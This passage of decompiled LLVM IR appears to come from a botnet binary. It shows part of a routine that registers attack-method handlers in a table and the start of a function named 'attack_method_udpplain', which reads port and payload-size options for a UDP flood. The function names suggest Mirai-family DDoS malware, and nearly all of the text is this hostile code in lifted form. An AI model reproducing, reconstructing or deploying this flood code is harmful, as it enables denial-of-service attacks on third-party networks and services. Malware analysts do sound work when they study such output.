  %v2_86a0 = load i32, i32* @r5, align 4
  %v3_86a0 = add i32 %v2_86a0, 4
  %v4_86a0 = inttoptr i32 %v3_86a0 to i8*
  store i8 %v1_86a0, i8* %v4_86a0, align 1
  %v0_86a4 = load i32, i32* %r1.global-to-local, align 4
  %v3_86a4 = mul i32 %v0_86a4, 4
  store i32 %v3_86a4, i32* %r1.global-to-local, align 4
  %v4_86a8 = inttoptr i32 %v2_8698 to i32*
  %v5_86a8 = call i32 @realloc(i32* %v4_86a8, i32 %v3_86a4, i32 %v6_865c, i32 ptrtoint (i32* @global_var_a088.39 to i32))
  %v2_86ac = load i8, i8* bitcast (i8** @global_var_23228.28 to i8*), align 4
  %v3_86ac = zext i8 %v2_86ac to i32
  store i32 %v3_86ac, i32* %r3.global-to-local, align 4
  store i32 %v5_86a8, i32* %r2.global-to-local, align 4
  %v0_86b4 = load i32, i32* @r5, align 4
  %v5_86b4 = mul nuw nsw i32 %v3_86ac, 4
  %v6_86b4 = add i32 %v5_86b4, %v5_86a8
  %v7_86b4 = inttoptr i32 %v6_86b4 to i32*
  store i32 %v0_86b4, i32* %v7_86b4, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_86bc = load i32, i32* %r3.global-to-local, align 4
  %v1_86bc = load i32, i32* @r8, align 4
  %v2_86bc = add i32 %v1_86bc, %v0_86bc
  store i32 %v2_86bc, i32* %r3.global-to-local, align 4
  %v1_86c4 = trunc i32 %v2_86bc to i8
  %v2_86c4 = load i32, i32* @r4, align 4
  %v3_86c4 = inttoptr i32 %v2_86c4 to i8*
  store i8 %v1_86c4, i8* %v3_86c4, align 1
  %v0_86c8 = load i32, i32* %r2.global-to-local, align 4
  %v1_86c8 = load i32, i32* @r6, align 4
  %v2_86c8 = inttoptr i32 %v1_86c8 to i32*
  store i32 %v0_86c8, i32* %v2_86c8, align 4
  %v2_86cc = call i32 @calloc(i32 %v1_86bc, i32 8)
  %v2_86d0 = load i8, i8* bitcast (i8** @global_var_23228.28 to i8*), align 4
  %v3_86d0 = zext i8 %v2_86d0 to i32
  store i32 ptrtoint (i32* @global_var_a4c0.41 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_86cc, i32* @r5, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v1_86e0 = load i32, i32* @r8, align 4
  %v2_86e0 = add i32 %v1_86e0, %v3_86d0
  store i32 %v2_86e0, i32* %r1.global-to-local, align 4
  %v2_86e4 = load i32, i32* @global_var_2322c.30, align 4
  %v2_86e8 = inttoptr i32 %v2_86cc to i32*
  store i32 ptrtoint (i32* @global_var_a4c0.41 to i32), i32* %v2_86e8, align 4
  %v3_86ec = load i32, i32* @r5, align 4
  %v4_86ec = add i32 %v3_86ec, 4
  %v5_86ec = inttoptr i32 %v4_86ec to i8*
  store i8 2, i8* %v5_86ec, align 1
  %v0_86f0 = load i32, i32* %r1.global-to-local, align 4
  %v3_86f0 = mul i32 %v0_86f0, 4
  store i32 %v3_86f0, i32* %r1.global-to-local, align 4
  %v5_86f4 = inttoptr i32 %v2_86e4 to i32*
  %v6_86f4 = call i32 @realloc(i32* %v5_86f4, i32 %v3_86f0, i32 ptrtoint (i32* @global_var_a4c0.41 to i32), i32 2)
  %v2_86f8 = load i8, i8* bitcast (i8** @global_var_23228.28 to i8*), align 4
  %v3_86f8 = zext i8 %v2_86f8 to i32
  store i32 %v3_86f8, i32* %r3.global-to-local, align 4
  store i32 %v6_86f4, i32* %r2.global-to-local, align 4
  %v0_8700 = load i32, i32* @r5, align 4
  %v5_8700 = mul nuw nsw i32 %v3_86f8, 4
  %v6_8700 = add i32 %v5_8700, %v6_86f4
  %v7_8700 = inttoptr i32 %v6_8700 to i32*
  store i32 %v0_8700, i32* %v7_8700, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_8708 = load i32, i32* %r3.global-to-local, align 4
  %v1_8708 = load i32, i32* @r8, align 4
  %v2_8708 = add i32 %v1_8708, %v0_8708
  store i32 %v2_8708, i32* %r3.global-to-local, align 4
  %v1_8710 = load i32, i32* @r6, align 4
  %v2_8710 = inttoptr i32 %v1_8710 to i32*
  store i32 %v6_86f4, i32* %v2_8710, align 4
  %v0_8714 = load i32, i32* %r3.global-to-local, align 4
  %v1_8714 = trunc i32 %v0_8714 to i8
  %v2_8714 = load i32, i32* @r4, align 4
  %v3_8714 = inttoptr i32 %v2_8714 to i8*
  store i8 %v1_8714, i8* %v3_8714, align 1
  %v2_8718 = call i32 @calloc(i32 %v1_8708, i32 8)
  %v2_871c = load i8, i8* bitcast (i8** @global_var_23228.28 to i8*), align 4
  %v3_871c = zext i8 %v2_871c to i32
  store i32 ptrtoint (i32* @global_var_89ac.43 to i32), i32* %r3.global-to-local, align 4
  store i32 8, i32* @r7, align 4
  store i32 %v2_8718, i32* @r5, align 4
  %v1_872c = load i32, i32* @r8, align 4
  %v2_872c = add i32 %v1_872c, %v3_871c
  store i32 %v2_872c, i32* %r1.global-to-local, align 4
  %v2_8730 = load i32, i32* @global_var_2322c.30, align 4
  %v2_8734 = inttoptr i32 %v2_8718 to i32*
  store i32 ptrtoint (i32* @global_var_89ac.43 to i32), i32* %v2_8734, align 4
  %v0_8738 = load i32, i32* @r7, align 4
  %v1_8738 = trunc i32 %v0_8738 to i8
  %v2_8738 = load i32, i32* @r5, align 4
  %v3_8738 = add i32 %v2_8738, 4
  %v4_8738 = inttoptr i32 %v3_8738 to i8*
  store i8 %v1_8738, i8* %v4_8738, align 1
  %v0_873c = load i32, i32* %r1.global-to-local, align 4
  %v3_873c = mul i32 %v0_873c, 4
  store i32 %v3_873c, i32* %r1.global-to-local, align 4
  %v4_8740 = inttoptr i32 %v2_8730 to i32*
  %v5_8740 = call i32 @realloc(i32* %v4_8740, i32 %v3_873c, i32 %v6_86f4, i32 ptrtoint (i32* @global_var_89ac.43 to i32))
  %v2_8744 = load i8, i8* bitcast (i8** @global_var_23228.28 to i8*), align 4
  %v3_8744 = zext i8 %v2_8744 to i32
  store i32 %v3_8744, i32* %r3.global-to-local, align 4
  store i32 %v5_8740, i32* %r2.global-to-local, align 4
  %v0_874c = load i32, i32* @r5, align 4
  %v5_874c = mul nuw nsw i32 %v3_8744, 4
  %v6_874c = add i32 %v5_874c, %v5_8740
  %v7_874c = inttoptr i32 %v6_874c to i32*
  store i32 %v0_874c, i32* %v7_874c, align 4
  %v0_8750 = load i32, i32* @r7, align 4
  store i32 %v0_8750, i32* %r1.global-to-local, align 4
  %v0_8754 = load i32, i32* %r3.global-to-local, align 4
  %v1_8754 = load i32, i32* @r8, align 4
  %v2_8754 = add i32 %v1_8754, %v0_8754
  store i32 %v2_8754, i32* %r3.global-to-local, align 4
  %v1_875c = trunc i32 %v2_8754 to i8
  %v2_875c = load i32, i32* @r4, align 4
  %v3_875c = inttoptr i32 %v2_875c to i8*
  store i8 %v1_875c, i8* %v3_875c, align 1
  %v0_8760 = load i32, i32* %r2.global-to-local, align 4
  %v1_8760 = load i32, i32* @r6, align 4
  %v2_8760 = inttoptr i32 %v1_8760 to i32*
  store i32 %v0_8760, i32* %v2_8760, align 4
  %v2_8764 = call i32 @calloc(i32 %v1_8754, i32 %v0_8750)
  %v2_8768 = load i8, i8* bitcast (i8** @global_var_23228.28 to i8*), align 4
  %v3_8768 = zext i8 %v2_8768 to i32
  store i32 ptrtoint (i32* @global_var_c1dc.45 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_8764, i32* @r5, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v1_8778 = load i32, i32* @r8, align 4
  %v2_8778 = add i32 %v1_8778, %v3_8768
  store i32 %v2_8778, i32* %r1.global-to-local, align 4
  %v2_877c = load i32, i32* @global_var_2322c.30, align 4
  %v2_8780 = inttoptr i32 %v2_8764 to i32*
  store i32 ptrtoint (i32* @global_var_c1dc.45 to i32), i32* %v2_8780, align 4
  %v3_8784 = load i32, i32* @r5, align 4
  %v4_8784 = add i32 %v3_8784, 4
  %v5_8784 = inttoptr i32 %v4_8784 to i8*
  store i8 3, i8* %v5_8784, align 1
  %v0_8788 = load i32, i32* %r1.global-to-local, align 4
  %v3_8788 = mul i32 %v0_8788, 4
  store i32 %v3_8788, i32* %r1.global-to-local, align 4
  %v5_878c = inttoptr i32 %v2_877c to i32*
  %v6_878c = call i32 @realloc(i32* %v5_878c, i32 %v3_8788, i32 ptrtoint (i32* @global_var_c1dc.45 to i32), i32 3)
  %v2_8790 = load i8, i8* bitcast (i8** @global_var_23228.28 to i8*), align 4
  %v3_8790 = zext i8 %v2_8790 to i32
  store i32 %v3_8790, i32* %r3.global-to-local, align 4
  store i32 %v6_878c, i32* %r2.global-to-local, align 4
  %v0_8798 = load i32, i32* @r5, align 4
  %v5_8798 = mul nuw nsw i32 %v3_8790, 4
  %v6_8798 = add i32 %v5_8798, %v6_878c
  %v7_8798 = inttoptr i32 %v6_8798 to i32*
  store i32 %v0_8798, i32* %v7_8798, align 4
  %v0_879c = load i32, i32* @r7, align 4
  store i32 %v0_879c, i32* %r1.global-to-local, align 4
  %v0_87a0 = load i32, i32* %r3.global-to-local, align 4
  %v1_87a0 = load i32, i32* @r8, align 4
  %v2_87a0 = add i32 %v1_87a0, %v0_87a0
  store i32 %v2_87a0, i32* %r3.global-to-local, align 4
  %v1_87a8 = trunc i32 %v2_87a0 to i8
  %v2_87a8 = load i32, i32* @r4, align 4
  %v3_87a8 = inttoptr i32 %v2_87a8 to i8*
  store i8 %v1_87a8, i8* %v3_87a8, align 1
  %v0_87ac = load i32, i32* %r2.global-to-local, align 4
  %v1_87ac = load i32, i32* @r6, align 4
  %v2_87ac = inttoptr i32 %v1_87ac to i32*
  store i32 %v0_87ac, i32* %v2_87ac, align 4
  %v2_87b0 = call i32 @calloc(i32 %v1_87a0, i32 %v0_879c)
  %v2_87b4 = load i8, i8* bitcast (i8** @global_var_23228.28 to i8*), align 4
  %v3_87b4 = zext i8 %v2_87b4 to i32
  store i32 ptrtoint (i32* @global_var_bae4.47 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_87b0, i32* @r5, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v1_87c4 = load i32, i32* @r8, align 4
  %v2_87c4 = add i32 %v1_87c4, %v3_87b4
  store i32 %v2_87c4, i32* %r1.global-to-local, align 4
  %v2_87c8 = load i32, i32* @global_var_2322c.30, align 4
  %v2_87cc = inttoptr i32 %v2_87b0 to i32*
  store i32 ptrtoint (i32* @global_var_bae4.47 to i32), i32* %v2_87cc, align 4
  %v3_87d0 = load i32, i32* @r5, align 4
  %v4_87d0 = add i32 %v3_87d0, 4
  %v5_87d0 = inttoptr i32 %v4_87d0 to i8*
  store i8 4, i8* %v5_87d0, align 1
  %v0_87d4 = load i32, i32* %r1.global-to-local, align 4
  %v3_87d4 = mul i32 %v0_87d4, 4
  store i32 %v3_87d4, i32* %r1.global-to-local, align 4
  %v5_87d8 = inttoptr i32 %v2_87c8 to i32*
  %v6_87d8 = call i32 @realloc(i32* %v5_87d8, i32 %v3_87d4, i32 ptrtoint (i32* @global_var_bae4.47 to i32), i32 4)
  %v2_87dc = load i8, i8* bitcast (i8** @global_var_23228.28 to i8*), align 4
  %v3_87dc = zext i8 %v2_87dc to i32
  store i32 %v3_87dc, i32* %r3.global-to-local, align 4
  store i32 %v6_87d8, i32* %r2.global-to-local, align 4
  %v0_87e4 = load i32, i32* @r5, align 4
  %v5_87e4 = mul nuw nsw i32 %v3_87dc, 4
  %v6_87e4 = add i32 %v5_87e4, %v6_87d8
  %v7_87e4 = inttoptr i32 %v6_87e4 to i32*
  store i32 %v0_87e4, i32* %v7_87e4, align 4
  %v0_87e8 = load i32, i32* @r7, align 4
  store i32 %v0_87e8, i32* %r1.global-to-local, align 4
  %v0_87ec = load i32, i32* %r3.global-to-local, align 4
  %v1_87ec = load i32, i32* @r8, align 4
  %v2_87ec = add i32 %v1_87ec, %v0_87ec
  store i32 %v2_87ec, i32* %r3.global-to-local, align 4
  %v1_87f4 = trunc i32 %v2_87ec to i8
  %v2_87f4 = load i32, i32* @r4, align 4
  %v3_87f4 = inttoptr i32 %v2_87f4 to i8*
  store i8 %v1_87f4, i8* %v3_87f4, align 1
  %v0_87f8 = load i32, i32* %r2.global-to-local, align 4
  %v1_87f8 = load i32, i32* @r6, align 4
  %v2_87f8 = inttoptr i32 %v1_87f8 to i32*
  store i32 %v0_87f8, i32* %v2_87f8, align 4
  %v2_87fc = call i32 @calloc(i32 %v1_87ec, i32 %v0_87e8)
  %v2_8800 = load i8, i8* bitcast (i8** @global_var_23228.28 to i8*), align 4
  %v3_8800 = zext i8 %v2_8800 to i32
  store i32 ptrtoint (i32* @global_var_b330.49 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_87fc, i32* @r5, align 4
  store i32 5, i32* %r3.global-to-local, align 4
  %v1_8810 = load i32, i32* @r8, align 4
  %v2_8810 = add i32 %v1_8810, %v3_8800
  store i32 %v2_8810, i32* %r1.global-to-local, align 4
  %v2_8814 = load i32, i32* @global_var_2322c.30, align 4
  %v2_8818 = inttoptr i32 %v2_87fc to i32*
  store i32 ptrtoint (i32* @global_var_b330.49 to i32), i32* %v2_8818, align 4
  %v3_881c = load i32, i32* @r5, align 4
  %v4_881c = add i32 %v3_881c, 4
  %v5_881c = inttoptr i32 %v4_881c to i8*
  store i8 5, i8* %v5_881c, align 1
  %v0_8820 = load i32, i32* %r1.global-to-local, align 4
  %v3_8820 = mul i32 %v0_8820, 4
  store i32 %v3_8820, i32* %r1.global-to-local, align 4
  %v5_8824 = inttoptr i32 %v2_8814 to i32*
  %v6_8824 = call i32 @realloc(i32* %v5_8824, i32 %v3_8820, i32 ptrtoint (i32* @global_var_b330.49 to i32), i32 5)
  %v2_8828 = load i8, i8* bitcast (i8** @global_var_23228.28 to i8*), align 4
  %v3_8828 = zext i8 %v2_8828 to i32
  store i32 %v3_8828, i32* %r3.global-to-local, align 4
  store i32 %v6_8824, i32* %r2.global-to-local, align 4
  %v0_8830 = load i32, i32* @r5, align 4
  %v5_8830 = mul nuw nsw i32 %v3_8828, 4
  %v6_8830 = add i32 %v5_8830, %v6_8824
  %v7_8830 = inttoptr i32 %v6_8830 to i32*
  store i32 %v0_8830, i32* %v7_8830, align 4
  %v0_8834 = load i32, i32* @r7, align 4
  store i32 %v0_8834, i32* %r1.global-to-local, align 4
  %v0_8838 = load i32, i32* %r3.global-to-local, align 4
  %v1_8838 = load i32, i32* @r8, align 4
  %v2_8838 = add i32 %v1_8838, %v0_8838
  store i32 %v2_8838, i32* %r3.global-to-local, align 4
  %v1_8840 = trunc i32 %v2_8838 to i8
  %v2_8840 = load i32, i32* @r4, align 4
  %v3_8840 = inttoptr i32 %v2_8840 to i8*
  store i8 %v1_8840, i8* %v3_8840, align 1
  %v0_8844 = load i32, i32* %r2.global-to-local, align 4
  %v1_8844 = load i32, i32* @r6, align 4
  %v2_8844 = inttoptr i32 %v1_8844 to i32*
  store i32 %v0_8844, i32* %v2_8844, align 4
  %v2_8848 = call i32 @calloc(i32 %v1_8838, i32 %v0_8834)
  %v2_884c = load i8, i8* bitcast (i8** @global_var_23228.28 to i8*), align 4
  %v3_884c = zext i8 %v2_884c to i32
  store i32 43900, i32* %r2.global-to-local, align 4
  store i32 %v2_8848, i32* @r5, align 4
  store i32 10, i32* %r3.global-to-local, align 4
  %v1_885c = load i32, i32* @r8, align 4
  %v2_885c = add i32 %v1_885c, %v3_884c
  store i32 %v2_885c, i32* %r1.global-to-local, align 4
  %v2_8860 = load i32, i32* @global_var_2322c.30, align 4
  %v2_8864 = inttoptr i32 %v2_8848 to i32*
  store i32 43900, i32* %v2_8864, align 4
  %v3_8868 = load i32, i32* @r5, align 4
  %v4_8868 = add i32 %v3_8868, 4
  %v5_8868 = inttoptr i32 %v4_8868 to i8*
  store i8 10, i8* %v5_8868, align 1
  %v0_886c = load i32, i32* %r1.global-to-local, align 4
  %v3_886c = mul i32 %v0_886c, 4
  store i32 %v3_886c, i32* %r1.global-to-local, align 4
  %v5_8870 = inttoptr i32 %v2_8860 to i32*
  %v6_8870 = call i32 @realloc(i32* %v5_8870, i32 %v3_886c, i32 43900, i32 10)
  %v2_8874 = load i8, i8* bitcast (i8** @global_var_23228.28 to i8*), align 4
  %v3_8874 = zext i8 %v2_8874 to i32
  store i32 %v3_8874, i32* %r3.global-to-local, align 4
  store i32 %v6_8870, i32* %r2.global-to-local, align 4
  %v0_887c = load i32, i32* @r5, align 4
  %v5_887c = mul nuw nsw i32 %v3_8874, 4
  %v6_887c = add i32 %v5_887c, %v6_8870
  %v7_887c = inttoptr i32 %v6_887c to i32*
  store i32 %v0_887c, i32* %v7_887c, align 4
  %v0_8880 = load i32, i32* @r7, align 4
  store i32 %v0_8880, i32* %r1.global-to-local, align 4
  %v0_8884 = load i32, i32* %r3.global-to-local, align 4
  %v1_8884 = load i32, i32* @r8, align 4
  %v2_8884 = add i32 %v1_8884, %v0_8884
  store i32 %v2_8884, i32* %r3.global-to-local, align 4
  %v1_888c = trunc i32 %v2_8884 to i8
  %v2_888c = load i32, i32* @r4, align 4
  %v3_888c = inttoptr i32 %v2_888c to i8*
  store i8 %v1_888c, i8* %v3_888c, align 1
  %v0_8890 = load i32, i32* %r2.global-to-local, align 4
  %v1_8890 = load i32, i32* @r6, align 4
  %v2_8890 = inttoptr i32 %v1_8890 to i32*
  store i32 %v0_8890, i32* %v2_8890, align 4
  %v2_8894 = call i32 @calloc(i32 %v1_8884, i32 %v0_8880)
  %v2_8898 = load i8, i8* bitcast (i8** @global_var_23228.28 to i8*), align 4
  %v3_8898 = zext i8 %v2_8898 to i32
  store i32 ptrtoint (i32* @global_var_9a6c.52 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_8894, i32* @r5, align 4
  store i32 6, i32* %r3.global-to-local, align 4
  %v1_88a8 = load i32, i32* @r8, align 4
  %v2_88a8 = add i32 %v1_88a8, %v3_8898
  store i32 %v2_88a8, i32* %r1.global-to-local, align 4
  %v2_88ac = load i32, i32* @global_var_2322c.30, align 4
  %v2_88b0 = inttoptr i32 %v2_8894 to i32*
  store i32 ptrtoint (i32* @global_var_9a6c.52 to i32), i32* %v2_88b0, align 4
  %v3_88b4 = load i32, i32* @r5, align 4
  %v4_88b4 = add i32 %v3_88b4, 4
  %v5_88b4 = inttoptr i32 %v4_88b4 to i8*
  store i8 6, i8* %v5_88b4, align 1
  %v0_88b8 = load i32, i32* %r1.global-to-local, align 4
  %v3_88b8 = mul i32 %v0_88b8, 4
  store i32 %v3_88b8, i32* %r1.global-to-local, align 4
  %v5_88bc = inttoptr i32 %v2_88ac to i32*
  %v6_88bc = call i32 @realloc(i32* %v5_88bc, i32 %v3_88b8, i32 ptrtoint (i32* @global_var_9a6c.52 to i32), i32 6)
  %v2_88c0 = load i8, i8* bitcast (i8** @global_var_23228.28 to i8*), align 4
  %v3_88c0 = zext i8 %v2_88c0 to i32
  store i32 %v3_88c0, i32* %r3.global-to-local, align 4
  store i32 %v6_88bc, i32* %r2.global-to-local, align 4
  %v0_88c8 = load i32, i32* @r5, align 4
  %v5_88c8 = mul nuw nsw i32 %v3_88c0, 4
  %v6_88c8 = add i32 %v5_88c8, %v6_88bc
  %v7_88c8 = inttoptr i32 %v6_88c8 to i32*
  store i32 %v0_88c8, i32* %v7_88c8, align 4
  %v0_88cc = load i32, i32* @r7, align 4
  store i32 %v0_88cc, i32* %r1.global-to-local, align 4
  %v0_88d0 = load i32, i32* %r3.global-to-local, align 4
  %v1_88d0 = load i32, i32* @r8, align 4
  %v2_88d0 = add i32 %v1_88d0, %v0_88d0
  store i32 %v2_88d0, i32* %r3.global-to-local, align 4
  %v1_88d8 = trunc i32 %v2_88d0 to i8
  %v2_88d8 = load i32, i32* @r4, align 4
  %v3_88d8 = inttoptr i32 %v2_88d8 to i8*
  store i8 %v1_88d8, i8* %v3_88d8, align 1
  %v0_88dc = load i32, i32* %r2.global-to-local, align 4
  %v1_88dc = load i32, i32* @r6, align 4
  %v2_88dc = inttoptr i32 %v1_88dc to i32*
  store i32 %v0_88dc, i32* %v2_88dc, align 4
  %v2_88e0 = call i32 @calloc(i32 %v1_88d0, i32 %v0_88cc)
  %v2_88e4 = load i8, i8* bitcast (i8** @global_var_23228.28 to i8*), align 4
  %v3_88e4 = zext i8 %v2_88e4 to i32
  store i32 ptrtoint (i32* @global_var_93d8.54 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_88e0, i32* @r5, align 4
  store i32 7, i32* %r3.global-to-local, align 4
  %v1_88f4 = load i32, i32* @r8, align 4
  %v2_88f4 = add i32 %v1_88f4, %v3_88e4
  store i32 %v2_88f4, i32* %r1.global-to-local, align 4
  %v2_88f8 = load i32, i32* @global_var_2322c.30, align 4
  %v2_88fc = inttoptr i32 %v2_88e0 to i32*
  store i32 ptrtoint (i32* @global_var_93d8.54 to i32), i32* %v2_88fc, align 4
  %v3_8900 = load i32, i32* @r5, align 4
  %v4_8900 = add i32 %v3_8900, 4
  %v5_8900 = inttoptr i32 %v4_8900 to i8*
  store i8 7, i8* %v5_8900, align 1
  %v0_8904 = load i32, i32* %r1.global-to-local, align 4
  %v3_8904 = mul i32 %v0_8904, 4
  store i32 %v3_8904, i32* %r1.global-to-local, align 4
  %v5_8908 = inttoptr i32 %v2_88f8 to i32*
  %v6_8908 = call i32 @realloc(i32* %v5_8908, i32 %v3_8904, i32 ptrtoint (i32* @global_var_93d8.54 to i32), i32 7)
  %v2_890c = load i8, i8* bitcast (i8** @global_var_23228.28 to i8*), align 4
  %v3_890c = zext i8 %v2_890c to i32
  store i32 %v3_890c, i32* %r3.global-to-local, align 4
  store i32 %v6_8908, i32* %r2.global-to-local, align 4
  %v0_8914 = load i32, i32* @r5, align 4
  %v5_8914 = mul nuw nsw i32 %v3_890c, 4
  %v6_8914 = add i32 %v5_8914, %v6_8908
  %v7_8914 = inttoptr i32 %v6_8914 to i32*
  store i32 %v0_8914, i32* %v7_8914, align 4
  %v0_8918 = load i32, i32* @r7, align 4
  store i32 %v0_8918, i32* %r1.global-to-local, align 4
  %v0_891c = load i32, i32* %r3.global-to-local, align 4
  %v1_891c = load i32, i32* @r8, align 4
  %v2_891c = add i32 %v1_891c, %v0_891c
  store i32 %v2_891c, i32* %r3.global-to-local, align 4
  %v1_8924 = trunc i32 %v2_891c to i8
  %v2_8924 = load i32, i32* @r4, align 4
  %v3_8924 = inttoptr i32 %v2_8924 to i8*
  store i8 %v1_8924, i8* %v3_8924, align 1
  %v0_8928 = load i32, i32* %r2.global-to-local, align 4
  %v1_8928 = load i32, i32* @r6, align 4
  %v2_8928 = inttoptr i32 %v1_8928 to i32*
  store i32 %v0_8928, i32* %v2_8928, align 4
  %v2_892c = call i32 @calloc(i32 %v1_891c, i32 %v0_8918)
  %v2_8930 = load i8, i8* bitcast (i8** @global_var_23228.28 to i8*), align 4
  %v3_8930 = zext i8 %v2_8930 to i32
  store i32 35916, i32* %r2.global-to-local, align 4
  store i32 %v2_892c, i32* @r5, align 4
  store i32 9, i32* %r3.global-to-local, align 4
  %v1_8940 = load i32, i32* @r8, align 4
  %v2_8940 = add i32 %v1_8940, %v3_8930
  store i32 %v2_8940, i32* %r1.global-to-local, align 4
  %v2_8944 = load i32, i32* @global_var_2322c.30, align 4
  %v2_8948 = inttoptr i32 %v2_892c to i32*
  store i32 35916, i32* %v2_8948, align 4
  %v3_894c = load i32, i32* @r5, align 4
  %v4_894c = add i32 %v3_894c, 4
  %v5_894c = inttoptr i32 %v4_894c to i8*
  store i8 9, i8* %v5_894c, align 1
  %v0_8950 = load i32, i32* %r1.global-to-local, align 4
  %v3_8950 = mul i32 %v0_8950, 4
  store i32 %v3_8950, i32* %r1.global-to-local, align 4
  %v5_8954 = inttoptr i32 %v2_8944 to i32*
  %v6_8954 = call i32 @realloc(i32* %v5_8954, i32 %v3_8950, i32 35916, i32 9)
  %v2_8958 = load i8, i8* bitcast (i8** @global_var_23228.28 to i8*), align 4
  %v3_8958 = zext i8 %v2_8958 to i32
  store i32 %v3_8958, i32* %r3.global-to-local, align 4
  %v1_895c = load i32, i32* @r6, align 4
  %v2_895c = inttoptr i32 %v1_895c to i32*
  store i32 %v6_8954, i32* %v2_895c, align 4
  %v0_8960 = load i32, i32* @r5, align 4
  %v2_8960 = load i32, i32* %r3.global-to-local, align 4
  %v5_8960 = mul i32 %v2_8960, 4
  %v6_8960 = add i32 %v5_8960, %v6_8954
  %v7_8960 = inttoptr i32 %v6_8960 to i32*
  store i32 %v0_8960, i32* %v7_8960, align 4
  %v0_8964 = load i32, i32* %r3.global-to-local, align 4
  %v1_8964 = load i32, i32* @r8, align 4
  %v2_8964 = add i32 %v1_8964, %v0_8964
  store i32 %v2_8964, i32* %r2.global-to-local, align 4
  %v1_896c = trunc i32 %v2_8964 to i8
  %v2_896c = load i32, i32* @r4, align 4
  %v3_896c = inttoptr i32 %v2_896c to i8*
  store i8 %v1_896c, i8* %v3_896c, align 1
  %v2_8970 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_8970, i32* @r4, align 4
  store i32 %v6_8620, i32* @r5, align 4
  store i32 %v9_8620, i32* @r6, align 4
  store i32 %v12_8620, i32* @r7, align 4
  store i32 %v15_8620, i32* @r8, align 4
  ret i32 %v1_8964

; uselistorder directives
  uselistorder i32 %v1_8964, { 1, 0 }
  uselistorder i32 %v3_8950, { 1, 0 }
  uselistorder i32 %v1_891c, { 1, 0 }
  uselistorder i32 %v3_8904, { 1, 0 }
  uselistorder i32 %v1_88d0, { 1, 0 }
  uselistorder i32 %v3_88b8, { 1, 0 }
  uselistorder i32 %v1_8884, { 1, 0 }
  uselistorder i32 %v3_886c, { 1, 0 }
  uselistorder i32 %v1_8838, { 1, 0 }
  uselistorder i32 %v3_8820, { 1, 0 }
  uselistorder i32 %v1_87ec, { 1, 0 }
  uselistorder i32 %v3_87d4, { 1, 0 }
  uselistorder i32 %v1_87a0, { 1, 0 }
  uselistorder i32 %v3_8788, { 1, 0 }
  uselistorder i32 %v1_8754, { 1, 0 }
  uselistorder i32 %v3_873c, { 1, 0 }
  uselistorder i32 %v1_8708, { 1, 0 }
  uselistorder i32 %v6_86f4, { 1, 2, 0, 3 }
  uselistorder i32 %v3_86f0, { 1, 0 }
  uselistorder i32 %v1_86bc, { 1, 0 }
  uselistorder i32 %v3_86a4, { 1, 0 }
  uselistorder i32 %v2_8680, { 1, 0 }
  uselistorder i32 %v6_865c, { 1, 2, 0, 3 }
  uselistorder i32 %v3_8658, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 0 }
  uselistorder i8* bitcast (i8** @global_var_23228.28 to i8*), { 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i8* @global_var_23229.37 to i32), { 2, 1, 0 }
  uselistorder i8** @global_var_23228.28, { 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_23228.28 to i32), { 1, 0 }
}

define i32 @attack_method_udpplain(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %v18_89ac = load i32, i32* @sb, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg4, i32* @r6, align 4
  store i32 %arg1, i32* @r7, align 4
  %v2_89c8 = call i32 @calloc(i32 %arg1, i32 4)
  store i32 %v2_89c8, i32* @sl, align 4
  %v0_89d4 = load i32, i32* @r7, align 4
  %v2_89d8 = call i32 @calloc(i32 %v0_89d4, i32 4)
  store i32 65535, i32* @r4, align 4
  %v0_89e4 = load i32, i32* @r6, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 %v2_89d8, i32* @r8, align 4
  %v0_89f4 = load i32, i32* @r5, align 4
  %v4_89f8 = inttoptr i32 %v0_89e4 to i32*
  %v5_89f8 = call i32 @attack_get_opt_int(i32 %v0_89f4, i32* %v4_89f8, i32 7, i32 65535)
  %v3_8a00 = urem i32 %v5_89f8, 65536
  %v0_8a04 = load i32, i32* @r6, align 4
  %v0_8a0c = load i32, i32* @r4, align 4
  store i32 %v0_8a0c, i32* %r3.global-to-local, align 4
  %v0_8a10 = load i32, i32* @r5, align 4
  %v5_8a18 = inttoptr i32 %v0_8a04 to i32*
  %v6_8a18 = call i32 @attack_get_opt_int(i32 %v0_8a10, i32* %v5_8a18, i32 6, i32 %v0_8a0c)
  %v0_8a1c = load i32, i32* @r6, align 4
  %v3_8a20 = mul i32 %v6_8a18, 65536
  store i32 %v3_8a20, i32* %sb.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  %v0_8a2c = load i32, i32* @r5, align 4
  %v4_8a30 = inttoptr i32 %v0_8a1c to i32*
  %v5_8a30 = call i32 @attack_get_opt_int(i32 %v0_8a2c, i32* %v4_8a30, i32 0, i32 512)
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_8a40 = load i32, i32* @r6, align 4
  %v0_8a44 = load i32, i32* @r5, align 4
  %v3_8a48 = urem i32 %v5_8a30, 65536
  store i32 %v3_8a48, i32* @r5, align 4
  %v4_8a4c = inttoptr i32 %v0_8a40 to i32*
  %v5_8a4c = call i32 @attack_get_opt_int(i32 %v0_8a44, i32* %v4_8a4c, i32 1, i32 1)
  %v0_8a50 = load i32, i32* %sb.global-to-local, align 4
